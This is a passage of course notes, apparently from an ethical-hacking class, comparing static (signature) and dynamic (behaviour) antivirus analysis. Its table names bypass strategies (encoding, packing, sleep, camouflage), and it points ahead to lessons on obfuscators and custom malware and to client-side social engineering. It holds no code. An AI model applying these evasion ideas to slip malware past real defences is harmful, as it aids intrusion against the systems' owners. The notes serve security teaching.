| Feature | Static Analysis | Dynamic Analysis |
| :--- | :--- | :--- |
| **What it checks** | The file's code (Signature). | The file's behavior (Action). |
| **Analogy** | Checking Mugshots. | Watching suspicious behavior. |
| **Bypass Strategy** | Change the code (Encoding/Packing). | Change the timing/behavior (Sleep/Camouflage). |
| **Difficulty** | Easy to bypass. | Harder to bypass. |

### **3. The "Next Step" in Learning**

The instructor notes that this is a huge topic.
* **Tools Approach:** Using pre-made tools (Packers/Obfuscators) is covered in "Social Engineering" courses.
* **Coding Approach:** Writing custom malware (which is much harder to detect) is covered in "Python/Programming" courses.

---

GAINING ACCESS - CLIENT SIDE ATTACKS - SOCIAL ENGINEERING
===

